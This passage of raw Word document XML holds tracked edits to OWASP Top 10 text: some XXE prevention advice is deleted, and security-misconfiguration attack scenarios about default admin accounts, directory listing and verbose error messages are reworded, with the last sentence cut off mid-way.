          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1983" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="005C43E9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>* Verify that XML or XSL file upload functionality validates incoming XML using XSD validation or similar.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="3C2A38DB"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84" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1985" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="005C43E9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>* SAST tools can help detect XXE in source code, although manual code review is the best alternative in large, complex applications with many integrations.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="3AD409EB"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86" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="738D4679" w14:textId="77777777" w:rsidR="003E073E" w:rsidRPr="003E073E"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87" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1988" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="005C43E9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>If these controls are not possible, consider using virtual patching, API security gateways, or Web Application Firewalls (WAFs) to detect, monitor, and block XXE attacks.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="52FA3E3B" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00096903">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:moveFrom w:id="1989" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveFromRangeStart w:id="1990" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z" w:name="move137923171"/>
    </w:p>
    <w:p w14:paraId="65325012" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00096903">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:moveFrom w:id="1991" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveFrom w:id="1992" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00AC649A">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## Example Attack Scenarios</w:t>
        </w:r>
      </w:moveFrom>
    </w:p>
    <w:p w14:paraId="5636BF4B" w14:textId="77777777" w:rsidR="00B74248" w:rsidRPr="00AC649A" w:rsidRDefault="00B74248" w:rsidP="00096903">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:moveFrom w:id="1993" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:moveFromRangeEnd w:id="1990"/>
    <w:p w14:paraId="11E627E1" w14:textId="0DD58273" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1994" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1995" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## Example Attack Scenarios</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="45949504" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1996" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="70258FB8" w14:textId="25B4B316" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1997" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>**Scenario #1</w:t>
      </w:r>
      <w:del w:id="1998" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003E073E" w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>**:</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1999" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>:**</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> The application server comes with sample applications</w:t>
      </w:r>
      <w:del w:id="2000" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003E073E" w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText xml:space="preserve"> that are </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="6C077ACE" w14:textId="20470FFC" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2001" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>not removed from the production server. These sample applications have</w:t>
      </w:r>
      <w:del w:id="2002" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003E073E" w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="75FF1F81" w14:textId="7DD5C134" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2003" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">known security flaws attackers use to compromise the server. </w:t>
      </w:r>
      <w:del w:id="2004" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003E073E" w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>If</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2005" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Suppose</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> one</w:t>
      </w:r>
      <w:del w:id="2006" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003E073E" w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="57687CA4" w14:textId="0C61E5B3" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2007" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>of these applications is the admin console, and default accounts weren't</w:t>
      </w:r>
      <w:del w:id="2008" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003E073E" w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="5E828541" w14:textId="22B5B69B" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2009" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>changed</w:t>
      </w:r>
      <w:ins w:id="2010" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>. In that case,</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> the attacker logs in with default passwords and</w:t>
      </w:r>
      <w:del w:id="2011" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003E073E" w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="503EFB1C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>takes over.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B343B9D" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3DDFB2BA" w14:textId="01EDE77A" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2012" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>**Scenario #2</w:t>
      </w:r>
      <w:del w:id="2013" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003E073E" w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>**:</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2014" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>:**</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Directory listing is not disabled on the server. An</w:t>
      </w:r>
      <w:del w:id="2015" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003E073E" w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="49D8685B" w14:textId="1ED5D6B0" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2016" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>attacker discovers they can simply list directories. The attacker finds</w:t>
      </w:r>
      <w:del w:id="2017" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003E073E" w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="0E283C49" w14:textId="0C99ED98" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2018" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>and downloads the compiled Java classes, which they decompile and</w:t>
      </w:r>
      <w:del w:id="2019" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003E073E" w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="389D6C1A" w14:textId="083C878F" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2020" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">reverse engineer to view the code. The attacker then finds a </w:t>
      </w:r>
      <w:del w:id="2021" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003E073E" w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText xml:space="preserve">serious </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2022" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>severe</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0A48E209" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>access control flaw in the application.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29143CC7" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="086C590A" w14:textId="69ADEB58" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2023" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>**Scenario #3</w:t>
      </w:r>
      <w:del w:id="2024" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003E073E" w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>**:</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2025" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>:**</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> The application server's configuration allows detailed</w:t>
      </w:r>
      <w:del w:id="2026" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003E073E" w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="3FA097B2" w14:textId="06AD373F" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2027" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">error messages, </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>e.g</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:del w:id="2028" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003E073E" w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>.</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2029" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>.,</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> stack traces, to be returned to users. This</w:t>
      </w:r>
      <w:del w:id="2030" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003E073E" w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="0EE850F2" w14:textId="3E2D11F3" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2031" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>potentially exposes sensitive information or underlying flaws such as</w:t>
      </w:r>
      <w:del w:id="2032" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003E073E" w:rsidRPr="003E073E">
          <w:rPr>
